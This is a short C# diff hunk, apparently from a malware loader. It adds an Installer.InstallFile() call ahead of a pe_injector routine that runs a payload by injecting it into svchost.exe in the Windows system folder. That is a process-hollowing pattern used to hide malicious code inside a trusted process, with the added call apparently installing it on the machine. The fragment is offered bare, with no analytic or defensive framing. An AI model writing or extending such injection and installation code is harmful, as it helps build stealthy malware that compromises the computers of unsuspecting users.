@@ -12,6 +12,8 @@ namespace A
             string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
             string winLogonPath = Path.Combine(sysPath, "svchost.exe");
 
+            Installer.InstallFile();
+
             pe_injector.RunExecRoutine(Payload, winLogonPath, string.Empty);
         }
     }
